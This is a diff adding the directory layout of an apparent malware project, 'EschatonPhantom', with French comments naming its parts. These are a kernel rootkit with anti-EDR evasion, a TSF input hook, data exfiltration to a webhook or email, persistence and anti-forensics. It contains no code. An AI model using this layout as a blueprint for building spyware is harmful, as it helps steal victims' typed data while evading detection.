@@ -1,0 +1,29 @@
+EschatonPhantom/
+│── Driver/               # Rootkit Kernel (DKOM + Anti-EDR)
+│   ├── EschatonDriver.c  # Code du driver
+│   ├── EschatonDriver.inf
+│   └── Makefile
+│
+│── UserMode/             # TSF Hook + Exfiltration
+│   ├── TSFHook/          # Hook TSF (DLL COM)
+│   │   ├── TSFHook.cpp
+│   │   ├── TSFHook.def
+│   │   └── TSFHook.rgs   # Script d'enregistrement COM
+│   │
+│   ├── Exfiltrator/      # Module d'exfiltration
+│   │   ├── Exfiltrator.cpp
+│   │   └── Exfiltrator.h
+│   │
+│   ├── Persistence/      # Mécanismes de persistance
+│   │   └── Persistence.cpp
+│   │
+│   ├── AntiForensic/     # Anti-EDR/Forensique
+│   │   └── AntiForensic.cpp
+│   │
+│   └── Main/             # Point d'entrée
+│       ├── main.cpp
+│       └── config.h      # Configuration (webhook, email, etc.)
+│
+└── Build/                # Scripts de compilation
+    ├── build_driver.bat
+    └── build_usermode.bat
